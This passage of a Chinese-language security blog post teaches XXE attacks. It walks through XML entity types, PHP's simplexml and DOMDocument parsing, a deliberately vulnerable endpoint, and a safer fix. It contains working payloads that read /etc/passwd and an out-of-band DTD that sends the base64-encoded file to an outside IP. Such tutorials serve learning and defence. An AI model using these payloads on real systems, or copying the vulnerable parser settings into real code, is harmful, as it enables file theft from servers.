+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE methodcall [<br>&lt;!ELEMENT methodname ANY &gt;<br>&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;<br>]&gt;<br>&lt;methodcall&gt;<br>    &lt;methodname&gt;&amp;xxe;&lt;/methodname&gt;<br>&lt;/methodcall&gt;<br></code></pre></td></tr></table></figure>
+
+<p>所以说能外部实体声明是xxe漏洞利用的基本</p>
+<h4 id="参数实体声明"><a href="#参数实体声明" class="headerlink" title="参数实体声明"></a>参数实体声明</h4><p>我们常常使用参数实体来进行外部dtd引用</p>
+<p>一般的格式如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!ENTITY % 实体名称 SYSTEM “URI”&gt;<br></code></pre></td></tr></table></figure>
+
+<p>可以见下面的这个使用方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;<br>&lt;!DOCTYPE foo [<br>    &lt;!ELEMENT foo ANY&gt;<br>    &lt;!ENTITY % xxe SYSTEM &quot;http://xxx.xxx.xxx/evil.dtd&quot;&gt;<br>    %xxe;<br>]&gt;<br>&lt;!--  引用远程DTD中定义的evil实体 --&gt;<br>&lt;foo&gt;&amp;evil;&lt;/foo&gt;<br></code></pre></td></tr></table></figure>
+
+<p>然后evil.dtd的文件内容如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!ENTITY evil SYSTEM “file:///c:/windows/win.ini” &gt;<br></code></pre></td></tr></table></figure>
+
+<p>可以看到引用完了之后是可以直接使用外部dtd里面的通用实体的</p>
+<p>前面我有讲一句话</p>
+<blockquote>
+<p>我们常常使用参数实体来进行外部dtd引用 </p>
+</blockquote>
+<p>为什么常常使用的是参数实体来进行外部dtd引用呢，为什么通用实体在xxe的漏洞利用过程中不能进行dtd的外部引用呢</p>
+<p>下面有两句话需要严格牢记</p>
+<ul>
+<li>参数实体% xxx 只能在dtd内部使用，不能在xml正文的子元素标签里面使用</li>
+<li>通用实体&amp; xxx 只能在xml正文里面使用，不能在dtd内部使用</li>
+</ul>
+<p>这两句话看起来是很绕的</p>
+<p>请见下面的这个例子</p>
+<p>看到下面的这个payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!DOCTYPE root [&lt;!ENTITY ben SYSTEM &quot;http://192.168.10.5:8000/1.dtd&quot;&gt;]&gt;<br>&lt;_123&gt;&lt;admin&gt;&amp;ben;&lt;/admin&gt;&lt;password&gt;&lt;/password&gt;&lt;/_123&gt;<br></code></pre></td></tr></table></figure>
+
+<p>然后1.dtd的文件内容如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&quot;&gt;<br>&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#x27;http://192.168.10.5:8000/?data=%file;&#x27;&gt;&quot;&gt;<br>%eval;<br>%exfil;<br></code></pre></td></tr></table></figure>
+
+<p>按照正常的逻辑是不是下面这个流程</p>
+<p>定义好ben的变量，引用外部的1.dtd</p>
+<p>然后使用1.dtd，在1.dtd里面解析%eval读取文件，然后解析%exfil发送文件的内容</p>
+<p>流程按道理来说是这样的，但是为什么不能这样呢？</p>
+<p>因为ben是一个通用实体，他解析的内容是会放到xml正文里面的，于是就会出现一个现象，1.dtd文件的内容是放到<admin>标签里面的，这样的话是不能解析成为xml语句从而使用1.dtd的，只会把这个当做文本来看待</p>
+<h4 id="引用公共实体"><a href="#引用公共实体" class="headerlink" title="引用公共实体"></a>引用公共实体</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;!ENTITY 实体名称 PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt;<br></code></pre></td></tr></table></figure>
+
+<p>私有外部实体：用 SYSTEM 关键字，引用的是「个人 &#x2F; 项目私有」的资源（比如你自己本地的 .&#x2F;info.txt、自己服务器的 <a target="_blank" rel="noopener" href="http://your.com/data.dtd%EF%BC%89%EF%BC%8C%E5%8F%AA%E6%9C%89%E4%BD%A0%E6%88%96%E4%BD%A0%E7%9A%84%E9%A1%B9%E7%9B%AE%E8%83%BD%E8%AE%BF%E9%97%AE%E5%A4%8D%E7%94%A8%E3%80%82">http://your.com/data.dtd），只有你或你的项目能访问复用。</a></p>
+<p>公共外部实体：用 PUBLIC 关键字，引用的是「公开标准化」的资源（比如 W3C 制定的通用实体、行业统一规范的实体资源），所有人都可以通过标准标识引用</p>
+<h3 id="使用php解析xml语句"><a href="#使用php解析xml语句" class="headerlink" title="使用php解析xml语句"></a>使用php解析xml语句</h3><p>在前面xml的语法已经学习的差不多了，现在开始看如何使用php写一个可以解析xml语句的代码</p>
+<h4 id="simplexml-load-file"><a href="#simplexml-load-file" class="headerlink" title="simplexml_load_file()"></a>simplexml_load_file()</h4><p>首先我们先编写一个简单的xml文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml-dtd">&lt;root&gt;<br>	&lt;man&gt;<br>		&lt;name&gt;yyy&lt;/name&gt;<br>		&lt;age&gt;20&lt;/age&gt;<br>	&lt;/man&gt;<br>		&lt;name&gt;sss&lt;/name&gt;<br>		&lt;age&gt;19&lt;/age&gt;<br>&lt;/root&gt;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../img/xxe/image-20260727221003044.png" srcset="/img/loading.gif" lazyload alt="image-20260727221003044"></p>
+<p>写上这个内容放到目录里面</p>
+<p>开始编写php代码解析这个xml</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$xml</span> = <span class="hljs-title function_ invoke__">simplexml_load_file</span>(<span class="hljs-string">&quot;mem.xml&quot;</span>);<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$xml</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>对于simplexml_load_file这个函数的意思是</p>
+<p>它读取一个 XML 文件，把它解析成一个 PHP <strong>对象（</strong><code>SimpleXMLElement</code>），让你可以像操作对象属性一样轻松访问 XML 中的数据</p>
+<p>访问这个<code>php</code>代码</p>
+<p><img src="/../img/xxe/image-20260727221101106.png" srcset="/img/loading.gif" lazyload alt="image-20260727221101106"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">SimpleXMLElement <span class="hljs-title function_ invoke__">Object</span> ( [man] =&gt; <span class="hljs-title function_ invoke__">Array</span> ( [<span class="hljs-number">0</span>] =&gt; SimpleXMLElement <span class="hljs-title function_ invoke__">Object</span> ( [name] =&gt; yyy [age] =&gt; <span class="hljs-number">20</span> ) [<span class="hljs-number">1</span>] =&gt; SimpleXMLElement <span class="hljs-title function_ invoke__">Object</span> ( [name] =&gt; sss [age] =&gt; <span class="hljs-number">19</span> ) ) )<br></code></pre></td></tr></table></figure>
+
+<p>整理一下是下面这个样子</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php">SimpleXMLElement Object<br>│<br>└── [man] =&gt; Array<br>    │<br>    ├── [<span class="hljs-number">0</span>] =&gt; SimpleXMLElement Object<br>    │   ├── [name] =&gt; yyy<br>    │   └── [age] =&gt; <span class="hljs-number">20</span><br>    │<br>    └── [<span class="hljs-number">1</span>] =&gt; SimpleXMLElement Object<br>        ├── [name] =&gt; sss<br>        └── [age] =&gt; <span class="hljs-number">19</span><br></code></pre></td></tr></table></figure>
+
+<p>仔细看看也是很好理解的</p>
+<p>可以看到的是成功转化为了对象，然后man很显然是一个数组</p>
+<p>既然像数组于是我们就可以调用数据</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$xml</span> = <span class="hljs-title function_ invoke__">simplexml_load_file</span>(<span class="hljs-string">&quot;mem.xml&quot;</span>);<br><span class="hljs-comment">//print_r($xml);</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$xml</span>-&gt;man[<span class="hljs-number">0</span>]-&gt; name;  <br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$xml</span>-&gt;man[<span class="hljs-number">1</span>]-&gt; name;  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>输出的是<code>yyysss</code></p>
+<p><code>simplexml_load_file()</code>函数吧XML文档载入对象中</p>
+<p><code>$xml</code>是一个Object对象</p>
+<h4 id="DOMDocument"><a href="#DOMDocument" class="headerlink" title="DOMDocument"></a>DOMDocument</h4><p>首先看到这个代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$xml</span> = <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;mem.xml&quot;</span>);<br><span class="hljs-variable">$doc</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br><span class="hljs-variable">$doc</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xml</span>);<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$doc</span>-&gt;<span class="hljs-title function_ invoke__">saveXML</span>());<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>解释这个代码</p>
+<p>首先是加载xml文件，加载有两种方式，一个是使用加载文件的函数比如是使用include，第二个是使用DOMDocument类自带的方法load()，如下就是使用load()方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// $xml = include(&quot;mem.xml&quot;);</span><br><span class="hljs-variable">$doc</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br><span class="hljs-variable">$doc</span>-&gt;<span class="hljs-title function_ invoke__">load</span>(<span class="hljs-string">&quot;mem.xml&quot;</span>);  <span class="hljs-comment">// ✅ 直接加载文件</span><br><span class="hljs-variable">$doc</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xml</span>);<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$doc</span>-&gt;<span class="hljs-title function_ invoke__">saveXML</span>());<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>加载好了之后</p>
+<p>创建一个 DOMDocument 对象（实例化）</p>
+<p>你可以把 DOMDocument 想象成一个”XML 处理器”：</p>
+<p>它能把 XML 字符串解析成一棵树形结构</p>
+<p>可以遍历、修改、删除、添加节点</p>
+<p>可以把树形结构再转回 XML 字符串</p>
+<p>然后就是这个语句$doc-&gt;loadXML($xml);</p>
+<p>这个语句是可以将xml语句加载到DOMDocument对象中进行解析</p>
+<p>然后saveXML() 把 DOMDocument 内部的树形结构转换回 XML 字符串</p>
+<p>最后输出</p>
+<p>讲到了这里就可以回到一个根本的问题，为什么要使用xml了</p>
+<p>在实际的业务当中有一下业务场景是需要使用xml的</p>
+<p>业务一：两家公司要相互交流业务，发送文件，但是两家公司功能开发的代码语言是不一样的，但是代码都能识别xml语句，于是就通过xml语句来传输数据</p>
+<p>业务二：很简单，就是文档解析的功能点</p>
+<p>业务三：开放平台与第三方API，在使用平台的api的时候也可能会使用xml语句来作为传输语言</p>
+<h4 id="手动写一个xml漏洞"><a href="#手动写一个xml漏洞" class="headerlink" title="手动写一个xml漏洞"></a>手动写一个xml漏洞</h4><p>来点实际的尝试手写一个xml漏洞代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xml</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xml</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xml</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br>    <span class="hljs-variable">$creds</span> = <span class="hljs-title function_ invoke__">simplexml_import_dom</span>(<span class="hljs-variable">$dom</span>);<br>    <span class="hljs-variable">$benben</span> = <span class="hljs-variable">$creds</span>-&gt;admin;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$benben</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>来看看这个代码是什么意思</p>
+<p><code>libxml_disable_entity_loader(false);</code>这个的意思是关闭防御：允许加载外部实体</p>
+<p><code>$xml = file_get_contents(&#39;php://input&#39;);</code>没有过滤的存储用户输入的值，作为文件的内容</p>
+<p>接下里就是进行xml解析的部分了</p>
+<p>前面已经讲过loadXML函数的简单实用方法了，然后这里还多另一个参数<code>LIBXML_NOENT | LIBXML_DTDLOAD</code></p>
+<p><code>LIBXML_DTDLOAD</code>看这个名字大概就可以猜出来这个参数的意思是啥了，其作用是允许解析器去加载和处理 DTD（文档类型定义）。 无论是内部的还是外部的 DTD，都允许解析，如果没有这个选项解析器会直接忽略<code>&lt;!DOCTYPE...&gt;</code></p>
+<p><code>LIBXML_NOENT</code>其含义是将实体引用（&xxe;）替换成它实际代表的内容，怎么理解呢？就是使用&amp;xxe这个变量的内容，如果没有这个参数的话&xxe; 被当作普通文本，不会被替换</p>
+<p>这里有一个关系图可以看看</p>
+<p><img src="/../img/xxe/image-20260727223806885.png" srcset="/img/loading.gif" lazyload alt="image-20260727223806885"></p>
+<p>总结一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">LIBXML_DTDLOAD	<span class="hljs-string">&quot;允许读取 DTD 中的外部资源&quot;</span>（给攻击者打开门）<br>LIBXML_NOENT	<span class="hljs-string">&quot;允许把 &amp;实体; 替换成实际内容&quot;</span>（帮攻击者把文件内容塞进去）<br></code></pre></td></tr></table></figure>
+
+<p>然后这个代码还有一种重要的</p>
+<p><code>$benben = $creds-&gt;admin;</code>可以看到这里echo的只有使用admin子元素包裹的内容，所以我们的payload只能写到admin子元素里面</p>
+<p>漏洞利用的数据包如下</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/xxe01/xxe01/class06.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Not(A:Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;144&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/xml;charset=utf-8<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>98<br><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">root</span> [<span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">ben</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span>]&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">_123</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">admin</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-symbol">&amp;ben;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">admin</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">_123</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+
+<p>对于这个数据包有一个是需要注意的需要注意一下content-type 的值是不是Content-Type: application&#x2F;xml;charset&#x3D;utf-8</p>
+<p>看看这个payload</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">root</span> [<span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">ben</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">_123</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">admin</span>&gt;</span><br><span class="hljs-symbol">&amp;ben;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">admin</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">_123</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>root是文档命名，随便取名<br>_123是根元素，也是随便命名</p>
+<p>这些命名是有一定的规则的</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">✅ 可以包含	字母（a-z, A-Z）、数字（<span class="hljs-number">0</span><span class="hljs-number">-9</span>）、下划线（_）、连字符（-）、点（.）	<span class="hljs-keyword">admin</span>、user_1、my-data<br>✅ 必须以	字母或下划线（_） 开头	<span class="hljs-keyword">admin</span> ✅、_123 ✅<br>❌ 不能以	数字开头	<span class="hljs-number">123</span> ❌、<span class="hljs-number">1</span><span class="hljs-keyword">admin</span> ❌<br>❌ 不能包含	空格、标点符号（除了 -、.、_）、特殊字符	my data ❌、<span class="hljs-keyword">user</span>@<span class="hljs-type">name</span> ❌<br>❌ 不能是	<span class="hljs-type">XML</span> 保留字（如 <span class="hljs-type">xml</span> 开头的名字）	<span class="hljs-type">xml</span> ❌、XmlTag <br></code></pre></td></tr></table></figure>
+
+<p>现在已经知道了有漏洞的代码的写法了，那么安全的写法是什么呢</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">true</span>);<br><span class="hljs-variable">$xml</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$xml</span>))&#123;<br>    <span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br>    <span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xml</span>);<br>    <span class="hljs-variable">$creds</span> = <span class="hljs-title function_ invoke__">simplexml_import_dom</span>(<span class="hljs-variable">$dom</span>);<br>    <span class="hljs-variable">$benben</span> = <span class="hljs-variable">$creds</span>-&gt;admin;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$benben</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>一些其他的安全写法见下</p>
+<p><img src="/../img/xxe/image-20260727224437308.png" srcset="/img/loading.gif" lazyload alt="image-20260727224437308"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div></div>
+      <div>https://exploreio.github.io/2026/07/25/xxe/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>ExploreIO</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年7月25日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/08/29/CVE-2026-79483/" title="CVE-2026-79483">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">CVE-2026-79483</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/05/16/sql_injec/" title="mysql注入教程">
+                        <span class="hidden-mobile">mysql注入教程</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="margin-top: 8px; font-size: 14px; opacity: 0.7;"> <span id="vercount_value_site_pv">Loading</span> 次访问 · <span id="vercount_value_site_uv">Loading</span> 位访客 </div> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100,"easing":"ease-in-out"})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
